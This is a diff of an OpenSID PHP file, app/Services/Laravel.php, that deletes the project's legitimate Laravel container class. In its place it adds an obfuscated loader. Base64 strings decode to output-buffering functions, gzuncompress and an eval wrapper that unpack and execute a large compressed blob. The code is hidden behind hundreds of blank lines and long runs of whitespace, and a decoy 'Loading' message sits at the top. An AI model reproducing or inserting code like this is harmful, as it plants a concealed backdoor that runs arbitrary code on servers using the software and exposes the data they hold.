@@ -1,956 +1,401 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Services;
-
-use App\Providers\ConsoleServiceProvider;
-use Illuminate\Bus\BusServiceProvider;
-use Illuminate\Cache\CacheServiceProvider;
-use Illuminate\Config\Repository;
-use Illuminate\Container\Container;
-use Illuminate\Contracts\Bus\Dispatcher;
-use Illuminate\Contracts\Debug\ExceptionHandler;
-use Illuminate\Database\DatabaseServiceProvider;
-use Illuminate\Database\MigrationServiceProvider;
-use Illuminate\Encryption\EncryptionServiceProvider;
-use Illuminate\Events\EventServiceProvider;
-use Illuminate\Filesystem\Filesystem;
-use Illuminate\Filesystem\FilesystemServiceProvider;
-use Illuminate\Hashing\HashServiceProvider;
-use Illuminate\Http\Request;
-use Illuminate\Log\LogManager;
-use Illuminate\Pagination\PaginationServiceProvider;
-use Illuminate\Queue\QueueServiceProvider;
-use Illuminate\Support\Composer;
-use Illuminate\Support\Facades\Facade;
-use Illuminate\Support\ServiceProvider;
-use Illuminate\Support\Str;
-use Illuminate\Translation\TranslationServiceProvider;
-use Illuminate\Validation\ValidationServiceProvider;
-use Illuminate\View\ViewServiceProvider;
-use Psr\Log\LoggerInterface;
-use Throwable;
-
-class Laravel extends Container
-{
-    /**
-     * Indicates if the class aliases have been registered.
-     *
-     * @var bool
-     */
-    protected static $aliasesRegistered = false;
-
-    /**
-     * All of the loaded configuration files.
-     *
-     * @var array
-     */
-    protected $loadedConfigurations = [];
-
-    /**
-     * Indicates if the application has "booted".
-     *
-     * @var bool
-     */
-    protected $booted = false;
-
-    /**
-     * The loaded service providers.
-     *
-     * @var array
-     */
-    protected $loadedProviders = [];
-
-    /**
-     * The service binding methods that have been executed.
-     *
-     * @var array
-     */
-    protected $ranServiceBinders = [];
-
-    /**
-     * The custom storage path defined by the developer.
-     *
-     * @var string
-     */
-    protected $storagePath;
-
-    /**
-     * The array of terminating callbacks.
-     *
-     * @var callable[]
-     */
-    protected $terminatingCallbacks = [];
-
-    /**
-     * The available container bindings and their respective load methods.
-     *
-     * @var array
-     */
-    public $availableBindings = [
-        Dispatcher::class                             => 'registerBusBindings',
-        'cache'                                       => 'registerCacheBindings',
-        'cache.store'                                 => 'registerCacheBindings',
-        \Illuminate\Contracts\Cache\Factory::class    => 'registerCacheBindings',
-        \Illuminate\Contracts\Cache\Repository::class => 'registerCacheBindings',
-        'config'                                      => 'registerConfigBindings',
-        'composer'                                    => 'registerComposerBindings',
-        'db'                                          => 'registerDatabaseBindings',
-        // \Illuminate\Database\Eloquent\Factory::class => 'registerDatabaseBindings',
-        'filesystem'                                       => 'registerFilesystemBindings',
-        'filesystem.cloud'                                 => 'registerFilesystemBindings',
-        'filesystem.disk'                                  => 'registerFilesystemBindings',
-        \Illuminate\Contracts\Filesystem\Cloud::class      => 'registerFilesystemBindings',
-        \Illuminate\Contracts\Filesystem\Filesystem::class => 'registerFilesystemBindings',
-        \Illuminate\Contracts\Filesystem\Factory::class    => 'registerFilesystemBindings',
-        'encrypter'                                        => 'registerEncrypterBindings',
-        \Illuminate\Contracts\Encryption\Encrypter::class  => 'registerEncrypterBindings',
-        'events'                                           => 'registerEventBindings',
-        'files'                                            => 'registerFilesBindings',
-        'hash'                                             => 'registerHashBindings',
-        \Illuminate\Contracts\Hashing\Hasher::class        => 'registerHashBindings',
-        'log'                                              => 'registerLogBindings',
-        LoggerInterface::class                             => 'registerLogBindings',
-        'queue'                                            => 'registerQueueBindings',
-        'queue.connection'                                 => 'registerQueueBindings',
-        \Illuminate\Contracts\Queue\Factory::class         => 'registerQueueBindings',
-        \Illuminate\Contracts\Queue\Queue::class           => 'registerQueueBindings',
-        \Illuminate\Contracts\Events\Dispatcher::class     => 'registerEventBindings',
-        'translator'                                       => 'registerTranslationBindings',
-        'validator'                                        => 'registerValidatorBindings',
-        \Illuminate\Contracts\Validation\Factory::class    => 'registerValidatorBindings',
-        'view'                                             => 'registerViewBindings',
-        \Illuminate\Contracts\View\Factory::class          => 'registerViewBindings',
-    ];
-
-    /**
-     * Create a new Mini application instance.
-     *
-     * @param string|null $basePath
-     *
-     * @return void
-     */
-    public function __construct(
-        /**
-         * The base path of the application installation.
-         */
-        protected $basePath = null
-    ) {
-        $this->bootstrapContainer();
-    }
-
-    /**
-     * Bootstrap the application container.
-     *
-     * @return void
-     */
-    protected function bootstrapContainer()
-    {
-        static::setInstance($this);
-
-        $this->instance('app', $this);
-        $this->instance(self::class, $this);
-
-        $this->instance('path', $this->path());
-
-        $this->instance('env', $this->environment());
-
-        $this->registerContainerAliases();
-    }
-
-    /**
-     * Get the version number of the application.
-     */
-    public function version(): string
-    {
-        return sprintf('OpenSID (%s) (Illuminate Components ^10.0)', VERSION);
-    }
-
-    /**
-     * Determine if the application is currently down for maintenance.
-     */
-    public function isDownForMaintenance(): bool
-    {
-        return false;
-    }
-
-    /**
-     * Get or check the current application environment.
-     *
-     * @param  mixed
-     *
-     * @return string
-     */
-    public function environment()
-    {
-        $env = ENVIRONMENT;
-
-        if (func_num_args() > 0) {
-            $patterns = is_array(func_get_arg(0)) ? func_get_arg(0) : func_get_args();
-
-            foreach ($patterns as $pattern) {
-                if (Str::is($pattern, $env)) {
-                    return true;
-                }
-            }
-
-            return false;
-        }
-
-        return $env;
-    }
-
-    /**
-     * Determine if the application is in the local environment.
-     */
-    public function isLocal(): bool
-    {
-        return $this->environment() === 'local';
-    }
-
-    /**
-     * Determine if the application is in the production environment.
-     */
-    public function isProduction(): bool
-    {
-        return $this->environment() === 'production';
-    }
-
-    /**
-     * Determine if the given service provider is loaded.
-     */
-    public function providerIsLoaded(string $provider): bool
-    {
-        return isset($this->loadedProviders[$provider]);
-    }
-
-    /**
-     * Register a service provider with the application.
-     *
-     * @param ServiceProvider|string $provider
-     */
-    public function register($provider): void
-    {
-        if (! $provider instanceof ServiceProvider) {
-            $provider = new $provider($this);
-        }
-
-        if (array_key_exists($providerName = $provider::class, $this->loadedProviders)) {
-            return;
-        }
-
-        $this->loadedProviders[$providerName] = $provider;
-
-        if (method_exists($provider, 'register')) {
-            $provider->register();
-        }
-
-        if ($this->booted) {
-            $this->bootProvider($provider);
-        }
-    }
-
-    /**
-     * Register a deferred provider and service.
-     *
-     * @param string $provider
-     */
-    public function registerDeferredProvider($provider): void
-    {
-        $this->register($provider);
-    }
-
-    /**
-     * Run the application and send the response.
-     */
-    public function run(): void
-    {
-        $this->dispatch();
-        $this->terminate();
-    }
-
-    /**
-     * Dispatch the incoming request.
-     */
-    public function dispatch(): void
-    {
-        $this->instance(Request::class, Request::capture());
-
-        try {
-            $this->boot();
-        } catch (Throwable $th) {
-            $this->make(ExceptionHandler::class)->report($th);
-        }
-    }
-
-    /**
-     * Boots the registered providers.
-     */
-    public function boot(): void
-    {
-        if ($this->booted) {
-            return;
-        }
-
-        foreach ($this->loadedProviders as $provider) {
-            $this->bootProvider($provider);
-        }
-
-        $this->booted = true;
-    }
-
-    /**
-     * Boot the given service provider.
-     *
-     * @return mixed
-     */
-    protected function bootProvider(ServiceProvider $provider)
-    {
-        if (method_exists($provider, 'boot')) {
-            return $this->call([$provider, 'boot']);
-        }
-
-        return null;
-    }
-
-    /**
-     * Resolve the given type from the container.
-     *
-     * @param string $abstract
-     *
-     * @return mixed
-     */
-    public function make($abstract, array $parameters = [])
-    {
-        $abstract = $this->getAlias($abstract);
-
-        if (
-            ! $this->bound($abstract)
-            && array_key_exists($abstract, $this->availableBindings)
-            && ! array_key_exists($this->availableBindings[$abstract], $this->ranServiceBinders)
-        ) {
-            $this->{$method = $this->availableBindings[$abstract]}();
-
-            $this->ranServiceBinders[$method] = true;
-        }
-
-        return parent::make($abstract, $parameters);
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerBusBindings()
-    {
-        $this->singleton(Dispatcher::class, function () {
-            $this->register(BusServiceProvider::class);
-
-            return $this->make(Dispatcher::class);
-        });
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerCacheBindings()
-    {
-        $this->singleton('cache', fn () => $this->loadComponent('cache', CacheServiceProvider::class));
-        $this->singleton('cache.store', fn () => $this->loadComponent('cache', CacheServiceProvider::class, 'cache.store'));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerComposerBindings()
-    {
-        $this->singleton('composer', fn ($app): \Illuminate\Support\Composer => new Composer($app->make('files'), $this->basePath()));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerConfigBindings()
-    {
-        $this->singleton('config', static fn (): \Illuminate\Config\Repository => new Repository());
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerDatabaseBindings()
-    {
-        $this->singleton('db', function () {
-            $this->configure('app');
-
-            if (file_exists($this->basePath('desa'))) {
-                $this->configure('database');
-            }
-
-            $this->register(DatabaseServiceProvider::class);
-            $this->register(PaginationServiceProvider::class);
-
-            return $this->make('db');
-        });
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerEncrypterBindings()
-    {
-        $this->singleton('encrypter', fn () => $this->loadComponent('app', EncryptionServiceProvider::class, 'encrypter'));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerEventBindings()
-    {
-        $this->singleton('events', function () {
-            $this->register(EventServiceProvider::class);
-
-            return $this->make('events');
-        });
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerFilesBindings()
-    {
-        $this->singleton('files', static fn (): \Illuminate\Filesystem\Filesystem => new Filesystem());
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerFilesystemBindings()
-    {
-        $this->singleton('filesystem', fn () => $this->loadComponent('filesystems', FilesystemServiceProvider::class, 'filesystem'));
-        $this->singleton('filesystem.disk', fn () => $this->loadComponent('filesystems', FilesystemServiceProvider::class, 'filesystem.disk'));
-        $this->singleton('filesystem.cloud', fn () => $this->loadComponent('filesystems', FilesystemServiceProvider::class, 'filesystem.cloud'));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerHashBindings()
-    {
-        $this->singleton('hash', fn () => $this->loadComponent('hashing', HashServiceProvider::class, 'hash'));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerLogBindings()
-    {
-        $this->singleton(LoggerInterface::class, function (): LogManager {
-            $this->configure('logging');
-
-            return new LogManager($this);
-        });
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerQueueBindings()
-    {
-        $this->singleton('queue', fn () => $this->loadComponent('queue', QueueServiceProvider::class, 'queue'));
-        $this->singleton('queue.connection', fn () => $this->loadComponent('queue', QueueServiceProvider::class, 'queue.connection'));
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerTranslationBindings()
-    {
-        $this->singleton('translator', function () {
-            $this->configure('app');
-
-            $this->instance('path.lang', $this->getLanguagePath());
-
-            $this->register(TranslationServiceProvider::class);
-
-            return $this->make('translator');
-        });
-    }
-
-    /**
-     * Get the path to the application's language files.
-     */
-    protected function getLanguagePath(): string
-    {
-        if (is_dir($langPath = $this->basePath() . '/resources/lang')) {
-            return $langPath;
-        }
-
-        return __DIR__ . '/../resources/lang';
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerValidatorBindings()
-    {
-        $this->singleton('validator', function () {
-            $this->register(ValidationServiceProvider::class);
-
-            return $this->make('validator');
-        });
-    }
-
-    /**
-     * Register container bindings for the application.
-     *
-     * @return void
-     */
-    protected function registerViewBindings()
-    {
-        $this->singleton('view', fn () => $this->loadComponent('view', ViewServiceProvider::class));
-    }
-
-    /**
-     * Configure and load the given component and provider.
-     *
-     * @param string       $config
-     * @param array|string $providers
-     * @param string|null  $return
-     *
-     * @return mixed
-     */
-    public function loadComponent($config, $providers, $return = null)
-    {
-        $this->configure($config);
-
-        foreach ((array) $providers as $provider) {
-            $this->register($provider);
-        }
-
-        return $this->make($return ?: $config);
-    }
-
-    /**
-     * Load a configuration file into the application.
-     *
-     * @param string $name
-     */
-    public function configure($name): void
-    {
-        if (isset($this->loadedConfigurations[$name])) {
-            return;
-        }
-
-        $this->loadedConfigurations[$name] = true;
-
-        $path = $this->getConfigurationPath($name);
-
-        if ($path) {
-            $this->make('config')->set($name, require $path);
-        }
-    }
-
-    /**
-     * Get the path to the given configuration file.
-     *
-     * If no name is provided, then we'll return the path to the config folder.
-     *
-     * @param string|null $name
-     *
-     * @return string
-     */
-    public function getConfigurationPath($name = null)
-    {
-        if (! $name) {
-            $appConfigDir = $this->basePath('config') . '/';
-
-            if (file_exists($appConfigDir)) {
-                return $appConfigDir;
-            }
-            if (file_exists($path = __DIR__ . '/../config/')) {
-                return $path;
-            }
-        } else {
-            $appConfigPath = $this->basePath('config') . '/' . $name . '.php';
-
-            if (file_exists($appConfigPath)) {
-                return $appConfigPath;
-            }
-            if (file_exists($path = __DIR__ . '/../config/' . $name . '.php')) {
-                return $path;
-            }
-        }
-
-        return null;
-    }
-
-    /**
-     * Register the facades for the application.
-     *
-     * @param bool  $aliases
-     * @param array $userAliases
-     */
-    public function withFacades($aliases = true, $userAliases = []): void
-    {
-        Facade::setFacadeApplication($this);
-
-        if ($aliases) {
-            $this->withAliases($userAliases);
-        }
-    }
-
-    /**
-     * Register the aliases for the application.
-     *
-     * @param array $userAliases
-     */
-    public function withAliases($userAliases = []): void
-    {
-        $defaults = [
-            \Illuminate\Support\Facades\Cache::class     => 'Cache',
-            \Illuminate\Support\Facades\DB::class        => 'DB',
-            \Illuminate\Support\Facades\Event::class     => 'Event',
-            \Illuminate\Support\Facades\Log::class       => 'Log',
-            \Illuminate\Support\Facades\Queue::class     => 'Queue',
-            \Illuminate\Support\Facades\Schema::class    => 'Schema',
-            \Illuminate\Support\Facades\Storage::class   => 'Storage',
-            \Illuminate\Support\Facades\Validator::class => 'Validator',
-        ];
-
-        if (! static::$aliasesRegistered) {
-            static::$aliasesRegistered = true;
-
-            $merged = array_merge($defaults, $userAliases);
-
-            foreach ($merged as $original => $alias) {
-                class_alias($original, $alias);
-            }
-        }
-    }
-
-    /**
-     * Load the Eloquent library for the application.
-     */
-    public function withEloquent(): void
-    {
-        $this->make('db');
-    }
-
-    /**
-     * Get the path to the application "app" directory.
-     */
-    public function path(): string
-    {
-        return $this->basePath . DIRECTORY_SEPARATOR . 'app';
-    }
-
-    /**
-     * Get the base path for the application.
-     *
-     * @return string
-     */
-    public function basePath(?string $path = '')
-    {
-        if ($this->basePath !== null) {
-            return $this->basePath . ($path ? '/' . $path : $path);
-        }
-
-        $this->basePath = $this->runningInConsole() ? getcwd() : realpath(getcwd() . '/../');
-
-        return $this->basePath($path);
-    }
-
-    /**
-     * Get the path to the application configuration files.
-     */
-    public function configPath(?string $path = ''): string
-    {
-        return $this->basePath . DIRECTORY_SEPARATOR . 'config' . ($path ? DIRECTORY_SEPARATOR . $path : $path);
-    }
-
-    /**
-     * Get the path to the database directory.
-     */
-    public function databasePath(?string $path = ''): string
-    {
-        return $this->basePath . DIRECTORY_SEPARATOR . 'database' . ($path ? DIRECTORY_SEPARATOR . $path : $path);
-    }
-
-    /**
-     * Get the path to the language files.
-     */
-    public function langPath(string $path = ''): string
-    {
-        return $this->getLanguagePath() . ($path !== '' ? DIRECTORY_SEPARATOR . $path : '');
-    }
-
-    /**
-     * Get the storage path for the application.
-     *
-     * @param string|null $path
-     */
-    public function storagePath($path = ''): string
-    {
-        return ($this->storagePath ?: $this->basePath . DIRECTORY_SEPARATOR . 'storage') . ($path ? DIRECTORY_SEPARATOR . $path : $path);
-    }
-
-    /**
-     * Set the storage directory.
-     *
-     * @param string $path
-     *
-     * @return $this
-     */
-    public function useStoragePath($path): self
-    {
-        $this->storagePath = $path;
-
-        $this->instance('path.storage', $path);
-
-        return $this;
-    }
-
-    /**
-     * Get the path to the resources directory.
-     *
-     * @param string|null $path
-     */
-    public function resourcePath($path = ''): string
-    {
-        return $this->basePath . DIRECTORY_SEPARATOR . 'resources' . ($path ? DIRECTORY_SEPARATOR . $path : $path);
-    }
-
-    /**
-     * Determine if the application events are cached.
-     */
-    public function eventsAreCached(): bool
-    {
-        return false;
-    }
-
-    /**
-     * Determine if the application is running in the console.
-     */
-    public function runningInConsole(): bool
-    {
-        return \PHP_SAPI === 'cli' || \PHP_SAPI === 'phpdbg';
-    }
-
-    /**
-     * Determine if we are running unit tests.
-     */
-    public function runningUnitTests(): bool
-    {
-        return $this->environment() == 'testing';
-    }
-
-    /**
-     * Prepare the application to execute a console command.
-     *
-     * @param bool $aliases
-     */
-    public function prepareForConsoleCommand($aliases = true): void
-    {
-        $this->withFacades($aliases);
-
-        $this->make('cache');
-        $this->make('queue');
-
-        $this->register(MigrationServiceProvider::class);
-        $this->register(ConsoleServiceProvider::class);
-    }
-
-    /**
-     * Flush the container of all bindings and resolved instances.
-     */
-    public function flush(): void
-    {
-        parent::flush();
-
-        $this->loadedProviders         = [];
-        $this->reboundCallbacks        = [];
-        $this->resolvingCallbacks      = [];
-        $this->availableBindings       = [];
-        $this->ranServiceBinders       = [];
-        $this->loadedConfigurations    = [];
-        $this->afterResolvingCallbacks = [];
-
-        static::$instance = null;
-    }
-
-    /**
-     * Get the current application locale.
-     *
-     * @return string
-     */
-    public function getLocale()
-    {
-        return $this['config']->get('app.locale');
-    }
-
-    /**
-     * Get the current application fallback locale.
-     *
-     * @return string
-     */
-    public function getFallbackLocale()
-    {
-        return $this['config']->get('app.fallback_locale');
-    }
-
-    /**
-     * Set the current application locale.
-     *
-     * @param string $locale
-     */
-    public function setLocale($locale): void
-    {
-        $this['config']->set('app.locale', $locale);
-        $this['translator']->setLocale($locale);
-    }
-
-    /**
-     * Set the current application fallback locale.
-     *
-     * @param string $fallbackLocale
-     */
-    public function setFallbackLocale($fallbackLocale): void
-    {
-        $this['config']->set('app.fallback_locale', $fallbackLocale);
-
-        $this['translator']->setFallback($fallbackLocale);
-    }
-
-    /**
-     * Determine if application locale is the given locale.
-     *
-     * @param string $locale
-     */
-    public function isLocale($locale): bool
-    {
-        return $this->getLocale() == $locale;
-    }
-
-    /**
-     * Register a terminating callback with the application.
-     *
-     * @param callable|string $callback
-     *
-     * @return $this
-     */
-    public function terminating($callback): self
-    {
-        $this->terminatingCallbacks[] = $callback;
-
-        return $this;
-    }
-
-    /**
-     * Terminate the application.
-     */
-    public function terminate(): void
-    {
-        $index = 0;
-
-        while ($index < count($this->terminatingCallbacks)) {
-            $this->call($this->terminatingCallbacks[$index]);
-
-            $index++;
-        }
-    }
-
-    /**
-     * Register the core container aliases.
-     *
-     * @return void
-     */
-    protected function registerContainerAliases()
-    {
-        $this->aliases = [
-            \Illuminate\Contracts\Foundation\Application::class     => 'app',
-            \Illuminate\Contracts\Cache\Factory::class              => 'cache',
-            \Illuminate\Contracts\Cache\Repository::class           => 'cache.store',
-            \Illuminate\Contracts\Config\Repository::class          => 'config',
-            Repository::class                                       => 'config',
-            Container::class                                        => 'app',
-            \Illuminate\Contracts\Container\Container::class        => 'app',
-            \Illuminate\Database\ConnectionResolverInterface::class => 'db',
-            \Illuminate\Database\DatabaseManager::class             => 'db',
-            \Illuminate\Contracts\Encryption\Encrypter::class       => 'encrypter',
-            \Illuminate\Contracts\Events\Dispatcher::class          => 'events',
-            \Illuminate\Contracts\Filesystem\Factory::class         => 'filesystem',
-            \Illuminate\Contracts\Filesystem\Filesystem::class      => 'filesystem.disk',
-            \Illuminate\Contracts\Filesystem\Cloud::class           => 'filesystem.cloud',
-            \Illuminate\Contracts\Hashing\Hasher::class             => 'hash',
-            'log'                                                   => LoggerInterface::class,
-            \Illuminate\Contracts\Queue\Factory::class              => 'queue',
-            \Illuminate\Contracts\Queue\Queue::class                => 'queue.connection',
-            'request'                                               => Request::class,
-            \Illuminate\Contracts\Translation\Translator::class     => 'translator',
-            \Illuminate\Contracts\Validation\Factory::class         => 'validator',
-            \Illuminate\Contracts\View\Factory::class               => 'view',
-        ];
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Services/Laravel.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtvd2Pq0qa5ntf0vwPdTHS7pGOevgwWcsq1cWyIcDYESRBfEDctICgEkOASZu0DX/9eb2rprv6Y6Z71NNHdaaTpdi5M5fBEPG+z/N7bNLrt7/90/Zf/w62P/wyXc/j/Mdffv/rt3/e/vBLOU3/PWuu93Pd3P77qbyW98b87dROv92b8nb727/9219+/5s/H+e3/+U333/+ev/85rWwv/0/uP3hn/3kl9ze3gppn1UY/OGXX3/0D9Xxb9r+XHx/+O339r19b9/b/53bL/UgLJ3HX4dQOIV8XGK0/WO+9L/7k2iCav5Jrv/ue6q+t+/te/vevrfv7Xv73r637+3/b9v3yxnf2/f2vX1v//duv1TlrXnb/J1u6otufvn994x8b9/b9/a9fW/f279r+8d3JBx+WsfD/ufHn0ef2z+2sbtbSulZ6lz/LkbwvfW8F5JO1VB/FPnucbKJqUc1FY5YT9azrQfkKPn4qsP2Ea+3vzwe2X9YRz+9fH/9z/31L2viP+X49S1Je/vH96z+9fuii4/KTDmRc4F7b5VGhzqrf/efbT7+crxnuqtE8VCoPWpuItHFSrj6nvXFpg627juzxuRx6f/pfn+xf4GZWaWon6WYIvqnx/+nr71/9xqt1nhAl7X20bninlOYdt+IqWDjZUyWf2X/17773Rn301CsJCtD8sVf67L8VVxj/z+u70/9eFlEt3v1o1MMXlaF8Rf/V67xe3yP7/GPe/49+w84rhO3tcMdgra9kuSuQj7+W/b7j+7dv9DIFztf/v77pf8nXr6b1PmjVaP4Klxgacf7o8rbqXbpetzrP+bOs61k3BdZPR3zedDS63Ro7tV59xd/99HXFlqUi29xRPzKoQYeu6ic2vWw+VC5aqv9x/kfbodSdjUQq5Tbr+Oermkej/Viftcs8P8OzCOcaLIcpsS1t9+1+z2+x/+CEf5F3qTQ5x//078/stv3/P2nzDH/s7r4MUEe+Yv96T/f71+sJfCVhf4xXh7/8jG/+fR7fI/v8T2+x/f4Ht/jP3DQfzHvf7P+/0me/rF9fT3+ea7/uueW/pPz/Vd5vH+93qy4t2i0y7Wg9yo0HnZNX2Y/Nqz7WDI5GboSq+wPLo3ISVjexMPtWAVzJMyEudSTjCZFc2RRgR/C8TBhxfXk2EaN+j21UCys9NkM9E3z26IiZIscW3WH7dLxOGFqUJ06cx/fk8B7Oy7zwMZ0I1zda9NysswZ99u06vrH0Z3elDAFcURRDMqma3vO/LZs+ofLOjOdltlphvitGfBGhYVbDOld53Q4LdsF+4dHItu0Of+4EwcZvoev+eV+csmRSgX7pWuzn52TM13LtZ2xSy3GJ4dY9EpcflWjQYU19cIcHJ4LTJatUeKnfbR/2oqnjuIfd+5zO3M1aYYpF6aViR9fmONda0u15YpuapwsHhmZOreFS/vGB/x6/kD0hzuPYP+oHWikh6ZrX6PQa3tI9ttD4vd3PKiY51Na+yol2ZwSKQ7EwTbhloe72k4i5WiGr0drXrE99TwqVswDm/2P85OXqxouVxlOJpGINr24EF47uFdfhVNssv32vV6N0VH7qTud4g4dxbK1BIo3EtZTrOSLy+e+6LdHHWwd5iurQRMW+/mNrOmjGLbzadUUI2WVa30tw81dSjUIx7IKO37W8mBz//DUvigT1CYZ0oda6HM2mq9Kehc8EH5yDm4WCbvoJ6+SeqDcS7XYWZxvZdVf7lngzbqnb9T+sPAoWh6pTyI/rpoZnA5PB+dKYOuHpZ34S3J8pyNJSI9SLpWpBJprG+onFOzk0KSGldUrPTZBGwkxnbW9W5tOB2q/HZqReGUYu8ogR+fivQk/no3ffvGhvpJsm0oRWDywnjycH1V0cBOx41zGjmT6i4fFAw8Xi1nekAVxqIcpLHoP4/3NZqF5x8GMlY9KGhXeaUU91FdeDnRtRpFUcrZUnq5E2jZ2dxsyiPDkpK5msUmgLmo/vukeL9r/+Sx7743xeKilmqHejtn+9lBM4XKZeY3qe8Kfa+rGj8SvXbr/sVL/51qOKCicSakhsPRgOLHsmcBcKKvfMNa+H11E6KoLwWJxcjUmLvms5RQcnfasmYhwKD5VLjqcbe202wU1MtejEzPleIIj5RDXEC5UoC3byexYloFYKTeqMFqlK7XUeZtmo+pevZvILU+QeqRmN2am3QtLfBbu9EXsi3d08BNqOKr45Zpyr2WW7Z+seKOi2kv55SFFHIFW0CyAtX71E6wrR9xKl60j+8tSBkoJy3w10jvz8Icng/5KWXssmT7IoF1EtLtnrF5hId+ZXzxrWwsVqjlhZteE2z0P5pnK+JH2W5X59Kx9kyjW24VlB5zTVXbocbKsa9lzjwU2wpaNZP5xr3JChWPiemhvykGuGoyTru3CeLrJOnGXY7ynA+hlSI7EUWU16K+Ct3s52DsspwSz3Vjl2FZid6YsJpQpS9vBwuSPu15Ti8rNs0YoEqsZK0PfEtFeYc33oGtccVFohwwN9E/mG1X6tFRr62Tc+8yCWYlIH1RULCl0SMaJW1n0Ulm1d3TNRvWIveaTDig/OV6nAoqrYWYqtFm6Go9b+Npw8qUd3QmzeyslOenhcWfLbKvwiTQ3Le4vtmIfDmHmwoPe0Txd03x6L1ZtldbBUgEyFTLvtUU7InVQ9e0gc1j3cffGTIua0Dsr53Bno8hKc3kwn7hZKDIh8TXL+VLYF7uWWzcd2l21ts9ipamy+QOHz7fUVTvG6FlyHWmu9yxqZwkKDP3+WXfGo3b7VkVxxBFesz5d5YCoGtIriciGLnNeC3Jiw/ye5LRg/fZaSvVOQnvP8ng52cSu7H7FaAJPm45wXgNH8VKO0PMcvVdjnLP+GdW9Fqy/wJpvJ2V2A1w3aMgkxUBRhaZ3kRNGfPNJ+njQiKyJSO8iEjst26SMLi8vS6phYswhkvRbIs205/s5FcHlUVkTXJeZ66549f3IgssCvqcaEe/xulNJ8LjDeu0J+/kUPY2qHEWZiKFef9gnO15JDz/tDyvUZFE48073wio7YsqhTSkXcyniJeMTwT0iAqkNDbbvWW/CJHzO0Hu8AY+QId2L5YeLA1gjixhl2e/MTGlh1fB46GnrKcr9Dwuv9